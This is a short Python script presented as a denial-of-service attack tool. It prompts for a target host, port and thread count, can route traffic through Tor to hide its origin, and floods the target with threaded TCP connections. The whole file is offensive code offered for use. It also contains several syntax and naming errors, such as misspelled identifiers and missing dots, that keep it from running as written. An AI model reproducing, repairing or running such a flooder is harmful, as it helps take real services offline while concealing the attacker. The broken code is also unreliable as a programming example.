import socket
import socks
import threading
import time
from datetime import datetime

class Dos:
	def __init__(self, host, port, nthreads, UserTor):
		self.host = host
		self.port = port
		self.nThreads = nThreads
		self.UserTor = UserTor

		if self.UserTor:
			socks.set_default_proxy(soscks.SOCKS5, '127.0.0.1', 9150)


		self.threads = []
		self.message = '-----= +[ DDos Attack by Maid ]+ =-----'



	def SendAttack(self):

		if.self.UserTor:
		    s = socks.socksocket()
		else:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		try:
			s.connect((self.host, self.port))

			s.send(self.message) #TCP ATTACK
			s.send(self.message, (self.host, self.port)) #UDPATTACK
		except:
			pass

		s.close()

	def Attack(self):
		for i in range(self.nThreads):
			t = threading Thread(target = self.SendAttack)
			self.threads append(t)

		for i in self.threads:
			i.start()

		for i in self.threads:
			i.join()


Tor = input('[?] Yuki.N> You will use Tor (y/n):').lower()
host = input('Yuki.N> [*] Enter Host : ')
port = int(input('Yuki.N> [*] Enter port : '))
threads = int(input('Yuki.N> [*] Enter Number Attack : '))
UserTor = False

if Tor == 'y':
	UserTor = True

hostip = socket.gethostbyname(host)

Dos = Dos(host, port, threads, UserTor)

print('\nHost %s ... IP %s ' % (host, hostip))
print('\n\n[*] Yuki.N> Starting The Attack %s... ' % (time.strftime("%H:%M:%S")))

start_time = datetime.now()

Dos.Attack()

end_time = datetime.now()
total_time = end_time - start_time

print('\n[*] Yuki.N> Attack was Done At %s... ' % (time.strftime("%H:%M:%S")))
print('[*] Yuki.N> Total Attack Time %s.... ' % (total_time))




